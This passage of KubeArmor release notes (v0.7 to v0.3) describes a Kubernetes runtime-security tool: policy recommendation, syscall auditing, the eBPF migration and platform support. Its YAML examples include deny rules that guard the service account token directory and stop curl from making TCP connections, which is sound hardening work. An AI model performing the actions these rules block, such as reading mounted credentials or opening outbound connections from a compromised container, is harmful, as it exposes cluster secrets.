| /usr/bin/dirname                  | /lib/x86_64-linux-gnu/                                             | 2     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/bin/head                     | /dev/urandom                                                       | 1     | Mon Nov 14 03:49:34 UTC 2022 | Allow  |
| /usr/bin/head                     | /etc/                                                              | 1     | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/bin/sha1sum                  | /etc/                                                              | 2     | Mon Nov 14 03:49:34 UTC 2022 | Allow  |
| /usr/bin/sha1sum                  | /lib/x86_64-linux-gnu/                                             | 1     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/apache2-foreground | /dev/tty                                                           | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/local/bin/apache2-foreground | /lib/x86_64-linux-gnu/                                             | 4     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/local/bin/php                | /dev/urandom                                                       | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/php                | /etc/                                                              | 11    | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/local/bin/php                | /lib/x86_64-linux-gnu/                                             | 31    | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/php                | /tmp/                                                              | 4     | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/lib/ssl/openssl.cnf                                           | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/lib/x86_64-linux-gnu/                                         | 29    | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/local/etc/php/conf.d                                          | 2     | Mon Nov 14 03:49:34 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/local/etc/php/conf.d/                                         | 10    | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/local/lib/php/extensions/no-debug-non-zts-20131226/gd.so      | 2     | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/local/lib/php/extensions/no-debug-non-zts-20131226/mysqli.so  | 3     | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/local/bin/php                | /usr/local/lib/php/extensions/no-debug-non-zts-20131226/opcache.so | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /usr/sbin/apache2                 | /dev/urandom                                                       | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/sbin/apache2                 | /etc/                                                              | 8     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/sbin/apache2                 | /lib/x86_64-linux-gnu/                                             | 4     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /usr/sbin/apache2                 | /usr/lib/ssl/openssl.cnf                                           | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
+-----------------------------------+--------------------------------------------------------------------+-------+------------------------------+--------+


Egress connections
+----------+--------------------+------------+------+-----------------+-----------+-------+------------------------------+
| PROTOCOL |      COMMAND       | POD/SVC/IP | PORT |    NAMESPACE    |  LABELS   | COUNT |      LAST UPDATED TIME       |
+----------+--------------------+------------+------+-----------------+-----------+-------+------------------------------+
| TCP      | /usr/local/bin/php | svc/mysql  | 3306 | wordpress-mysql | app=mysql | 1     | Mon Nov 14 03:49:44 UTC 2022 |
+----------+--------------------+------------+------+-----------------+-----------+-------+------------------------------+

```

### Policy Recommendations and Reports

KubeArmor already had a community driven curated list of System and Network policy templates at [policy-template](https://github.com/kubearmor/policy-templates) repository. With the templates, it was upto the user to change values like `namespace` `labels` etc to make sure that the policies are actually enforcing on their cluster.

With the new `karmor recommend` it is made sure that the user doesn't have to change anything on the policy but rather simply apply them to get a secure environment for the Kubernetes deployments.

![karmor-recommend](https://user-images.githubusercontent.com/9133227/201516809-6c664041-f5f9-4628-be1b-12252a1155c7.gif)

`karmor recommend` recommends policies based on container image, k8s manifest or the actual runtime environment itself.

```sh
$ karmor recommend --help
Recommend policies based on container image, k8s manifest or the actual runtime env

Usage:
  karmor recommend [flags]
  karmor recommend [command]

Available Commands:
  update      Updates policy-template cache

Flags:
  -c, --config string      absolute path to image registry configuration file
  -h, --help               help for recommend
  -i, --image strings      Container image list (comma separated)
  -l, --labels strings     User defined labels for policy (comma separated)
  -n, --namespace string   User defined namespace value for policies
  -o, --outdir string      output folder to write policies (default "out")
  -r, --report string      report file (default "report.txt")
  -t, --tag strings        tags (comma-separated) to apply. Eg. PCI-DSS, MITRE

Global Flags:
      --context string      Name of the kubeconfig context to use
      --kubeconfig string   Path to the kubeconfig file to use

Use "karmor recommend [command] --help" for more information about a command.
```

### Bug fixes and improvements

* Ability to specific LSM order ([#788](https://github.com/kubearmor/KubeArmor/issues/788)). On certain platforms it is possible that multiple LSMs are available for enforcing a policy. For e.g., in case of Google COS (Container Optimized OS), both AppArmor and BPF-LSM are available. By default, KubeArmor chooses BPF-LSM if available, but with this change it is possible to specify the LSM order that could be used for policy enforcement.
* Support for readOnly flag with BPF-LSM ([#962](https://github.com/kubearmor/KubeArmor/pull/962))
* Fix AppArmor policies behavior ([#954](https://github.com/kubearmor/KubeArmor/issues/954))
* Discovery engine fixes
  * Relative path are not shown anymore
  * Improved `karmor summary` output
  * Improved discovered policies rules to include all necessary paths

# v0.6

## Support for non-orchestrated containers

KubeArmor already has support for K8s orchestrated and Bare-Metal/VM workloads. With the v0.6 stable release, KubeArmor will also support un-orchestrated containerized workloads. KubeArmor supports both observability and policy enforcement in this mode.

### The need for supporting non-orchestrated containers?

KubeArmor recently did a POC with [LFEdge Open Horizon](https://www.lfedge.org/projects/openhorizon/) project. Open Horizon supports using containerized workloads on the edge such that multiple applications from different vendors could be deployed on the edge node as different containers. It is imperative that the security aspects of such a multi-tenant solution needs to be taken into consideration. It is required that the security gaps in one of the container should not lead to compromises in other containers or at the host level. Container isolation and hardening has to be ensured such that the blast radius and containment of security flaws is localized.

![](https://user-images.githubusercontent.com/9133227/189186043-059270e8-d80a-4f3f-83ab-cb18f201bb30.png)

### Path to Zero Trust Edge

Discovering and enforcing least-permissive policies...

For the enforcement, KubeArmor generates AppArmor profiles for individual containers based on the policy specified. The containers are required to start with the AppArmor profiles attached (using security-opt apparmor='profile-name'). These profiles can later be dynamically updated by KubeArmor to insert, modify or remove the AppArmor enforcement. Un-orchestrated workloads have a real use case in edge devices where orchestration is hard due to resource restrictions. KubeArmor can now help protect such environment.

## Introducing a lenient way to whitelisting policies

Whitelisting is a security strategy where you predefine all the entities that are to be permitted to execute and access resources. It is a fairly extreme containment measure that, if properly implemented, can prevent many security issues. KubeArmor supports whitelisting by leveraging "Allow" Action in the [Policy Specification](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification). But as mentioned it's an extreme containment measure and is fairly hard to implement. What if we want to confine what processes a particular resource can be accessed by. With v0.6 release, KubeArmor has a way to confine what processes a particular resource can be accessed by.

[An example policy :](https://github.com/kubearmor/KubeArmor/blob/main/tests/smoke/res/ksp-wordpress-lenient-allow-sa.yaml)

```yaml
  file:
    matchDirectories:
      - dir: /run/secrets/kubernetes.io/serviceaccount/
        recursive: true
        action: Block # Block access to service account token to everyone
      - dir: /
        recursive: true
      - dir: /run/secrets/kubernetes.io/serviceaccount/
        recursive: true
        fromSource:
          - path: /bin/cat # Allow access to service account token to only cat
  process:
    matchDirectories:
      - dir: /
        recursive: true # Allow all other process execution in general
```

Service Account Tokens are automounted to Pods, it helps provide better access to the Kubernetes API server. But this token becomes problematic if an attacker gains access to a container via some other exploit. We can set [`automountServiceAccountToken: false`](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) but for Pods where Service Account Tokens are needed, the token is still exposed to all the entities available inside the pod. The above KubeArmor Policy helps restrict the access to Service Account Token to some particular binaries (in this case `/bin/cat`).

## kArmor Probe, get support/insights for KubeArmor

`karmor probe` checks for supported KubeArmor features in the current environment. This was worked upon by [Esther Adenekan](https://www.linkedin.com/in/esther-adenekan-2949549a/) as part of [LFX Mentorship Program](https://mentorship.lfx.linuxfoundation.org/). ![karmor-probe-help](https://user-images.githubusercontent.com/47106543/188512043-13fe0a43-6630-4536-ac41-4874e28c1a99.png)

If we run `karmor probe` when KubeArmor is not available. It does a precheck to know if KubeArmor will be supported in the environment and what KubeArmor features will be supported e.g: observability, enforcement, etc... ![image](https://user-images.githubusercontent.com/47106543/188512242-a1d46981-56d3-46c7-8770-afe6df3f1c90.png)

If KubeArmor is running in some form, `karmor probe` extracts insights from running KubeArmor like what all elements are being enforced and how is KubeArmor configured to run. ![image](https://user-images.githubusercontent.com/47106543/188512388-e9813fe9-e571-4836-813d-b4d383efb015.png)

## Performance improvements

In v0.6, we profiled KubeArmor using pprof and did some major performance improvements such as:

### Optimizing container monitor

When Containerd is being used as the runtime, KubeAmor uses the containerd client for monitoring containers in the cluster. However, the container monitor was looking for new containers too frequently and calling a particular time consuming method. Reducing this frequency saved us a lot of CPU cycles.

### Memory usage improvements due to migration to Cilium ebpf

With the migration to Cilium eBPF we decreased KubeArmor's memory usage. Checkout [**BCC deprectation in favor of cilium/ebpf**](#migrating-to-libbpf-from-bcc) section for more details.

### Increasing `perf` buffer size

In addition to CPU and memory optimizations we have increased our perf buffer size to prevent events loss due to high events rate.

### Result

We were able to reduce KubeArmor resource consumption drastically from: ![Screenshot from 2022-08-30 18-35-51](https://user-images.githubusercontent.com/54525605/187445712-24412e9a-cebd-460a-a87a-e654b293dde1.png)

to this 🎉

![image](https://user-images.githubusercontent.com/54525605/187445905-8c418c83-1d8c-4a27-85fa-d786cb9af68e.png)

To discover all the improvements that we implemented please checkout this wiki article [Performance improvements in v0.6](https://github.com/kubearmor/KubeArmor/wiki/Performance-improvements-in-v0.6)

## Ability to watch for system calls events

Starting from v0.6, KubeArmor introduced the ability to explicitly monitor for system calls and alert based on rules set by the user. The system calls rules matching engine offers multiple options for our users to slice and dice system calls to obtain useful information about their systems.

### How can I leverage this new functionality ?

Our users can set policies to alerts for system call based on many criterion such as:

* system call name
* system call source (binary or directory)
* system call target (binary or directory)

### Real life example

In this example we want to watch for file deletions via the `unlink` system calls that impacts any directory under `/home/`.

**KubeArmorPolicy:**

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: audit-home-rmdir
  namespace: default
spec:
  severity: 3
  selector:
    matchLabels:
      container: ubuntu-1
  syscalls:
    matchPaths:
    - syscall:
      - rmdir
      path: /home/
      recursive: true
  action:
    Audit
```

**Generated telemetry**

```json
{
  "Timestamp": 1661936575,
  "UpdatedTime": "2022-08-31T09:02:55.841537Z",
  "ClusterName": "default",
  "HostName": "vagrant",
  "NamespaceName": "default",
  "PodName": "ubuntu-1-6779f689b5-jjcvh",
  "Labels": "container=ubuntu-1",
  "ContainerID": "1f613df8390b9d2e4e89d0323ac0b9a2e7d7ddcc460720e15074f8c497aec0df",
  "ContainerName": "nginx",
  "ContainerImage": "nginx:latest@sha256:b95a99feebf7797479e0c5eb5ec0bdfa5d9f504bc94da550c2f58e839ea6914f",
  "HostPPID": 255296,
  "HostPID": 302715,
  "PPID": 47,
  "PID": 67,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/bin/rmdir",
  "PolicyName": "audit-home-rmdir",
  "Severity": "3",
  "Type": "MatchedPolicy",
  "Source": "/bin/rmdir home/jane-doe/",
  "Operation": "Syscall",
  "Resource": "/home/jane-doe",
  "Data": "syscall=SYS_RMDIR",
  "Action": "Audit",
  "Result": "Passed"
}
```

For more information, Please checkout our policy specification documentation.

KubeArmorPolicy specification: <https://docs.kubearmor.com/kubearmor/getting-started/security\\_policy\\_specification>

KubeArmorHostPolicy specification: <https://docs.kubearmor.com/kubearmor/getting-started/host\\_security\\_policy\\_specification>

## Migrating to libbpf from BCC

KubeArmor uses eBPF to trace various kernel events and gain visibility on what's happening. We have been leveraging the BCC ( [BPF Compiler Collection](https://github.com/iovisor/bcc)) Framework to interact with the kernel through eBPF. BCC is going to great lengths to simplify BPF developer’s life, but sometimes that extra convenience gets in the way and makes it actually harder to figure out what’s wrong and how to fix it.

BCC includes Clang and LLVM with it and executes compilation from the main program at runtime causing sudden heavy resource utilisation which sometimes result crashes in our container due resource limitations. Also there was an added dependency on Kernel Headers which needed to be manually installed on the Host and made available to KubeArmor for it's working.

In this release, we have migrated off from BCC to [`libbpf`](https://github.com/libbpf/libbpf) and [`cilium/ebpf`](https://github.com/cilium/ebpf), decoupled compilation of eBPF Object files from main KubeArmor container to an init container. Some benefits that come with this migration include:

* No sudden outbursts of resource utilisation in the main container
* Lower Resource Utilisation
* No Dependency on Kernel Header if kernel supports BTF ( BPF Type Format ). BTF is generally available on kernel version > 5.2, for kernel's without BTF information we still require Kernel Headers.
* No CGO dependency in KubeArmor binary, making our systemd releases more portable and not dependent on certain glibc versions anymore.
* Lighter KubeArmor binary with reduced attack surface, due to removal of the llvm toolchain and BCC from the kubearmor container.

## Extend KubeArmor support on OpenShift and RKE

![](https://user-images.githubusercontent.com/9133227/189175237-c579dc3f-9c6a-46da-94da-a6d022de5e0d.png)

**OpenShift**

With the v0.5 release, KubeArmor already supports cri-o. With this release we have successfully tested KubeArmor on OpenShift on RHEL 8.4 (kernel 4.18) in observability/audit mode. RHEL 8.4 is shipped with SELinux as the LSM and KubeArmor supports SELinux only for host-based policy enforcement. This work was done by Vikas Verma as part of [LFX Mentorship Program](https://mentorship.lfx.linuxfoundation.org/project/af03f76c-6253-4efc-b26b-17c522794813).

**RKE**

KubeArmor now supports Rancher [RKE](https://rancher.com/products/rke) in both observability and enforcement mode.

> **Note** KubeArmor is currently not tested for [RKE deployed on host using a Docker container](https://rancher.com/docs/rancher/v2.5/en/installation/other-installation-methods/single-node-docker/).

# v0.5

## KubeArmor v0.5 Release Notes

KubeArmor adds a number of new capabilities in this 0.5 release, including:

* support for BPF-LSM policy enforcement,
* integration with the Kubernetes admission controller, and
* support for the CRI-O container runtime engine.

We’ve expanded platform support to include AWS Bottlerocket and Linux 2 and Microsoft AKS. We’ve also added support for network rules in SELinux, made improvements to the CLI, along with other enhancements and fixes.

## Support for BPF-LSM for policy enforcement

KubeArmor today leverages LSMs such as AppArmor, SELinux for policy enforcement. With v0.5, Kubearmor now integrates with BPF-LSM for pod/container based policy enforcement as well. [BPF-LSM](https://docs.kernel.org/bpf/prog_lsm.html) is a new LSM ([Linux Security Modules](https://github.com/kubearmor/KubeArmor/wiki/Introduction-to-Linux-Security-Modules-\(LSMs\))) that is introduced in the newer kernels (version > 5.7). BPF-LSM allows Kubearmor to attach bpf-bytecode at LSM hooks. This changes everything, since now with bpf-bytecode kubearmor has access to much richer information/kernel context and it does not have to work within the constraints of SELinux and AppArmor policy language.

![](https://user-images.githubusercontent.com/9133227/185108027-28782421-2a53-458d-80a7-b2c7c2d2bbbd.png)

#### What platforms support BPF-LSM?

* Latest images of GKE COS (> 1.22.6-gke.1000 [ref](https://cloud.google.com/kubernetes-engine/docs/release-notes-rapid))
* [AWS Bottlerocket](https://aws.amazon.com/bottlerocket/)
* Latest images of [Amazon Linux 2](https://aws.amazon.com/amazon-linux-2/). *Note: The default Amazon Linux 2 is still at kernel version 5.4 and hence bpf-lsm cannot be used with it.*
* Most of the managed cloud platforms are already leveraging latest kernel images in their latest OS images. Detailed information could be found [here](https://github.com/nyrahul/linux-kernel-configs#lsm-support).

In fact in most of the latest kernels, the bpf-lsm config is enabled by default.

Relevant Issues/PRs: [#484](https://github.com/kubearmor/KubeArmor/issues/484), [#741](https://github.com/kubearmor/KubeArmor/pull/741)

#### What happens if the OS image supports both AppArmor and BPF-LSM? What will be used for policy enforcement?

If BPF-LSM is available, that takes priority by default. Note that BPF-LSM is a [stackable LSM](https://github.com/kubearmor/KubeArmor/wiki/Introduction-to-Linux-Security-Modules-\(LSMs\)#stackable-vs-non-stackable-lsms) (unlike AppArmor, SELinux) which means it can be enabled with existing non-stackable LSMs such as AppArmor/SELinux. Thus if for some reason the bpf-lsm enforcer fails, the AppArmor enforcer will be automatically used underneath the hood.

#### Is their any change in the `KubeArmorPolicy` construct for BPF-LSM?

No. The [existing constructs](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification) work as it is. This means for the user, there is no change in the way policies have to be specified.

## Support for AWS Bottlerocket 🚀 and Amazon Linux 2 (latest image)

![kubearmor-bottlerocket](https://user-images.githubusercontent.com/9133227/179066384-0376b316-d6ec-45ac-9b57-1e76e83e5fbe.png)

#### What security does Bottlerocket offer?

Bottlerocket is a security focussed Linux based Open Source OS from Amazon that is purpose built for container based workloads. The intention with Bottlerocket is to avoid installation of maintenance packages directly as part of host OS and install only bare-minimum host packages that are required to run the containers. Maintenance tools could in turn be installed as containers if necessary.

#### How Kubearmor improves on Bottlerocket security?

Bottlerocket uses SELinux to lock down the host and provides some limited inter-container isolation.

KubeArmor provides enhanced security by using BPF-LSM to protect Bottlerocket containers from **within** by limiting system behavior with respect to processes, files, etc. For e.g., a k8s security access token that is mounted within the pod is accessible by default across all the containers. KubeArmor can restrict access to such tokens only for certain processes. Similarly KubeArmor can be used to protect other sensitive information e.g., k8s secrets, x509 certs, within the container. Moreover, KubeArmor can restrict execution of certain binaries within the containers.

![](https://user-images.githubusercontent.com/9133227/179067248-ffae6ab9-bdc7-4804-89b2-223a5946ae9f.png)

#### Want to try out AWS Bottlerocket with KubeArmor?

Here is the [quick start guide](https://github.com/kubearmor/KubeArmor/wiki/KubeArmor-Bottlerocket-OS-deployment-guide).

## KubeArmor now uses k8s admission controller to inject security annotations

KubeArmor depends upon AppArmor, SELinux and the underlying LSMs for security policy enforcement. In the context of k8s, such policies need to be specified as annotations. Before v0.5, Kubearmor used to apply deployment patch to inject such annotations. This resulted in the deployment to be restarted. Furthermore, one cannot apply annotations to pods that are not started as part of deployments.

In v0.5, Kubearmor has started making use of k8s admission controller feature to inject annotations in the pod. This resolves the deployment restart issue as well as the annotations can now be applied to pods as well.

![](https://user-images.githubusercontent.com/9133227/178907616-58d19959-dd5c-4de2-96c8-40980401f769.png)

The detailed design document can be found [here](https://github.com/kubearmor/KubeArmor/wiki/Annotation-controller).

Relevant issues/PRs: [#360](https://github.com/kubearmor/KubeArmor/issues/360), [#687](https://github.com/kubearmor/KubeArmor/pull/687), [#655](https://github.com/kubearmor/KubeArmor/pull/655)

## Support for CRI-O

KubeArmor directly interfaces with container runtimes to get metadata like container’s namespaces, image and so on. This metadata is then used for generating rich telemetry data and policy enforcement.

In the past, KubeArmor has supported Containerd and Docker and now with v0.5, KubeArmor will also support the CRI-O runtime. This has been made possible by leveraging the [CRI-API](https://github.com/kubernetes/cri-api). Also, if you have multiple container runtimes, you can now use the CRI\_SOCKET environment var or the -criSocket flag with kubearmor for specifying one to use.

![](https://user-images.githubusercontent.com/9133227/178956254-521e042a-9428-42b7-82db-57b07877902d.png)

Relevant Issues/PRs: [#697](https://github.com/kubearmor/KubeArmor/pull/697)

## Support for Microsoft AKS

![](https://user-images.githubusercontent.com/9133227/179068652-eb2bacd7-10cb-4429-8bea-55d7e44350b6.png)

KubeArmor now supports Microsoft AKS and has been validated with the default OS images used on AKS.

Relevant PRs: [#721](https://github.com/kubearmor/KubeArmor/pull/721)

## Network rules support for SELinux

Kubearmor [process-bound network rules](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification#network) allows one to limit network communication to only certain processes. It is possible to enable/disable TCP/UDP/ICMP communication for certain processes only.

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorHostPolicy
metadata:
  name: ksp-block-curl-tcp
spec:
  severity: 8
  selector:
    matchLabels:
      kubernetes.io/hostname: gcp-host-tunnel
  network:
    matchProtocols:
    - protocol: tcp
      fromSource:
        - path: /usr/bin/curl
  action:
    Block
```

The above policy prevents `/usr/bin/curl` from initiating tcp connection.

SELinux support was added as part of v0.4.4 but could not handle the \[network based rules]. v0.5 adds support for network based rules.

## Improvements to kubearmor cli tool

[Kubearmor client tool](https://github.com/kubearmor/kubearmor-client) can be used to install, uninstall, watch alerts/telemetry, observe and discover kubearmor security policies. The client tool automatically identifies the underlying k8s/container platform and appropriates handles the deployment. The same client tool can be used across any deployment mode (viz, k8s, pure-containerized and VM/Bare-metal).

Kubearmor client tool was extended to support different filtering options based on process name, resource type, namespace, labels etc. This filtering implementation was handled by a LFX mentee and is documented [here](https://sach1n.medium.com/lfx-mentorship-and-me-5bda26594f63).

# v0.3

KubeArmor adds a number of new capabilities in this 0.3 release, including:

## Default Security Posture (@daemon1024)

One of the tenets of achieving Zero Trust stature requires one to set the workloads in "least-permissive mode". Setting up least-permissive mode can be fraught with challenges and it is important that the tooling supports gradual upgrade to the least-permissive mode. One of the important tool is setting audit or dry-run mode for the policies before one can use the block/deny mode.

KubeArmor supports deny-by-default mode wherein one can specify what actions are allowed and everything else get denied. However, this mode can be a fatal for security ops folks since it has the possibility to bring down the application. While KubeArmor always supported an audit mode, version 0.3 release [PR#630](https://github.com/kubearmor/KubeArmor/pull/630) & [PR#595](https://github.com/kubearmor/KubeArmor/issues/595) brings in a more streamlined approach for handling this mode.

* It is now possible to set the global mode for default posture separartely for file/process, capabilities and network operations.
* Further, it is now possible to set the default posture at namespace level for file/process, capabilities and network operations.

An example of setting the default network posture to audit mode for `namespace=multiubuntu`.

```
~❯❯❯  kubectl annotate ns multiubuntu kubearmor-network-posture=audit --overwrite
namespace/multiubuntu annotated
~❯❯❯  kubectl describe ns multiubuntu
Name:         multiubuntu
Labels:       kubernetes.io/metadata.name=multiubuntu
Annotations:  kubearmor-network-posture: audit
Status:       Active
```

## `ProcessName`, `ParentProcessName` fields in all telemetry events (@nam-jaehyun)

KubeArmor [PR#632](https://github.com/kubearmor/KubeArmor/pull/632) now generates an appropriate `processName` and `parentProcessName` in the context of every event. Earlier Kubearmor had several issues especially in cases where the binaries could be symbolic links, relative paths used to invoke the binary. With version 0.3 kubearmor now leverages LSM hook kprobe `security_bprm_check` to get an absolute binary path for the executable.

```json
{
  "Timestamp": 1648788707,
  "UpdatedTime": "2022-04-01T04:51:47.854366Z",
  "ClusterName": "default",
  "HostName": "ubuntu2004-vagrants",
  "NamespaceName": "explorer",
  "PodName": "knoxautopolicy-f69c455-9824f",
  "ContainerID": "60d9a043cdb09fc99d26bfe22d1d0961e981f407b5d747626f14ad01515a41e8",
  "ContainerName": "knoxautopolicy",
  "HostPID": 1379898,
  "PPID": 404,
  "PID": 414,
  "PolicyName": "autopol-system-4153385364",
  "Severity": "1",
  "Type": "MatchedPolicy",
  "Source": "/usr/bin/bash",
  "Operation": "Process",
  "Resource": "/usr/bin/chmod",
  "Data": "syscall=SYS_EXECVE",
  "Action": "Block",
  "Result": "Permission denied",
  "ContainerImage": "docker.io/nyrahul/knoxautopolicy:dev@sha256:3d696f1650ac8b9932cb975c98f69a406b12fc8514f0b0ad39b19c8dfd2add8f",
  "ParentProcessName": "/usr/bin/bash",
  "ProcessName": "/usr/bin/chmod"
}
```

Note the `ProcessName` and `ParentProcessName` fields in the json fields.

## Support for Virtual Machines (@seswarrajan)

KubeArmor [now supports](https://docs.kubearmor.io/kubearmor/quick-links/kubearmor_vm) policy enforcement directly on the workloads installed on the hosts (either in virtual machine or on bare-metals). There were several fixes ([#658](https://github.com/kubearmor/KubeArmor/pull/658), [#631](https://github.com/kubearmor/KubeArmor/pull/631)) to Kubearmor especially to handle restart conditions.

## Branching and Release Strategy (@Ankurk99, @nyrahul)

KubeArmor is maturing both in terms of feature set and in terms of managing release procedures. With version 0.3 [#590](https://github.com/kubearmor/KubeArmor/issues/590) we are now following a streamlined branching and release strategy. Some key highlights are:

1. Have `main` as our bleeding edge branch where things might be unstable.
2. Release kubearmor every month or two with a new release version and release logs ... the versioning will be v0.2, v0.3 and so on ... If there are any backports, those will be handled as part of release-candidates version .. for e.g. v0.2-rc1, v0.2-rc2 and so on
3. Every version (including release candidates) will have a tag created.
4. Every version (not including release candidates) will have a branch name corresponding to the version name (for e.g., v0.2).
5. KubeArmor dockerhub image will have following: a. `kubearmor/kubearmor:latest` pointing to main branch image b. `kubearmor/kubearmor:v0.2` ... version specific image ... release candidates will update this image itself for the corresponding version c. `kubearmor/kubearmor:stable` ... a version will be upgraded to stable version only after enough due diligence (what this due diligence is would be considered in the future) .. for e.g., we might have v0.2, v0.3 as existing versions but stable might point to v0.2
6. karmor cli tool and helm charts will ensure that the right accessory tooling (for e.g., kubearmor-relay-server) is made use of for the appropriate kubearmor version.

## Support for KubeArmor on GKE Rapid Release, Regular & Stable channels

Google's GKE [supports multiple release channels](https://cloud.google.com/kubernetes-engine/docs/concepts/release-channels) and KubeArmor has now been tested across the latest release across all these release channels. Earlier, we found ([issue#579](https://github.com/kubearmor/KubeArmor/issues/579)) that GKE has further constrained access to the system folder on images of Rapid/Regular release channels. Fixed through [PR#648](https://github.com/kubearmor/KubeArmor/pull/648).
